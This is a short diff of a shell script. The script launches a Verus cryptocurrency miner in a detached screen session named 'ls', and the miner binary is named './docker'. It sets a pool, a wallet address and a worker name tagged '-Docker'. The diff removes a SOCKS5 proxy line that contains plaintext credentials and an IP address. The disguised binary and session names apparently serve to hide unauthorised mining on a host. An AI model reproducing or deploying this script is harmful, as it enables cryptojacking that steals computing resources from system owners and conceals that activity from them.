@@ -6,5 +6,4 @@ screen -dmS ls
 POOL=stratum+tcp://na.luckpool.net:3956
 WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
-PROXY=socks5://cuan:berhasil123@199.249.170.113:443
-./docker -a verus -o $POOL -u $WALLET.$WORKER -p c=VRSC,zap=VRSC -t 2 -x $PROXY
+./docker -a verus -o $POOL -u $WALLET.$WORKER -p c=VRSC,zap=VRSC -t 2 -x
